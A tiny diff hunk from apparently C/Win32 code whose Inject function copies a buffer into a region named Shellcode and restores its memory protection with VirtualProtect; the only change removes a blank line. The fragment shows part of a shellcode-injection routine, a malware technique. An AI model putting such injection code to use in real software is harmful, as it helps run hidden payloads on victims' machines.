@@ -50,7 +50,6 @@ BOOL Inject( PVOID lpBuffer, DWORD dwSize )
 		goto cleanup;
 	}
 
-
 	CopyMemoryEx( Shellcode, lpBuffer, dwSize );
 
 	if (!VirtualProtect( Shellcode, SHELLCODE_SIZE, OldProtection, &OldProtection ))
